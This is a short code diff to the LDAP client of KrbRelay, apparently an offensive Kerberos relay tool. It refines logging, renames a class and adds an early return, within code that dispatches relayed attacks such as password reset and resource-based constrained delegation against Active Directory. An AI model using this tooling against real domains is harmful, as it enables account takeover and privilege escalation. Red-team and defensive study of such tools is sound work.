@@ -26,7 +26,7 @@ namespace KrbRelay.Clients
                 out IntPtr servresp
             );
 
-            Console.WriteLine("[*] bind: {0}", bind);
+            Console.WriteLine("[*] ldap_sasl_bind: {0}",  (LdapStatus)bind);
 
             Interop.ldap_get_option(State.ld, 0x0031, out int value);
             Console.WriteLine("[*] ldap_get_option: {0}", (LdapStatus)value);
@@ -51,7 +51,7 @@ namespace KrbRelay.Clients
                     {
                         string arg1 = State.attacks["reset-password"].Split(new[] { ' ' }, 2)[0];
                         string arg2 = State.attacks["reset-password"].Split(new[] { ' ' }, 2)[1];
-                        Attacks.Ldap.setPassword.attack(State.ld, arg1, arg2);
+                        Attacks.Ldap.SetPassword.attack(State.ld, arg1, arg2);
                     }
                     if (State.attacks.Keys.Contains("rbcd"))
                     {
@@ -82,7 +82,10 @@ namespace KrbRelay.Clients
                 }
 
                 Interop.ldap_unbind(State.ld);
+
+                return;
             }
+
             if ((LdapStatus)value != LdapStatus.SaslBindInProgress)
             {
                 Console.WriteLine("[-] Ldap failed");
